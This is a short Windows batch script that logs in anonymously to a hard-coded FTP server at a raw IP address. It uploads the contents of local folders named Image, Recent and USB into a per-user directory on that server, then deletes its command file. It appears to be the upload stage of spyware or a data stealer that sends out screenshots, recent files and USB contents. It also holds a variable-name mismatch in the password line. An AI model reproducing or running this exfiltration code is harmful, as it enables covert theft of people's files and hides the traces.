@ECHO OFF
SETLOCAL EnableExtensions

REM Connection information:
SET Server=50.1.2.90
SET usrname=anonymous
SET pssword=

REM ---- Do not modify anything below this line ----

SET Commands="%TEMP%SendToFTP_commands.txt"

REM FTP user name and password. No spaces after either.
ECHO %usrname%>%Commands%
ECHO %password%>>%Commands%

REM FTP transfer settings.
rem ECHO prompt>>%Commands%
ECHO binary>>%Commands%

ECHO mkdir USER_1>>%Commands%
ECHO cd USER_1>>%Commands%

ECHO mkdir Image>>%Commands%
ECHO mkdir Recent>>%Commands%
ECHO mkdir USB>>%Commands%

ECHO mput C:\Anonymous\*>>%Commands%
ECHO cd Image>>%Commands%
ECHO mput C:\Anonymous\Image\*>>%Commands%
ECHO cd ..>>%Commands%
ECHO cd Recent>>%Commands%
ECHO mput C:\Anonymous\Recent\*>>%Commands%
ECHO cd ..>>%Commands%
ECHO cd USB>>%Commands%
ECHO mput C:\Anonymous\USB\*>>%Commands%


REM Close the FTP connection.
ECHO close>>%Commands%
ECHO bye>>%Commands%

REM Perform the FTP.
FTP -d -i -s:%Commands% %Server%

ECHO.
ECHO.

REM Clean up.
IF EXIST %Commands% DEL %Commands%

ENDLOCAL
